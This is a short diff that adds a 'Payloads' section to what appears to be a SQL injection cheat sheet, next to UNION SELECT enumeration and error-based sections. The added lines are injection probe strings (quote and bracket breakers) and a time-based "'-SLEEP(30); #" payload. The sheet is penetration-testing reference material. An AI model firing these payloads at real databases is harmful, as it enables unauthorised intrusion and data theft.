@@ -144,6 +144,38 @@ Database (BBDD, DB) enumeration (sustituir el numero correspondiente del último
 ```
 UNION SELECT 1,2,...
 ```
+### Payloads
+
+```
+'
+```
+```
+)'
+```
+```
+''
+```
+```
+`
+```
+```
+')
+```
+```
+'')
+```
+```
+`)
+```
+```
+'))
+```
+```
+`)
+```
+```
+'-SLEEP(30); #
+```
 
 ### In-band or Error Based
 
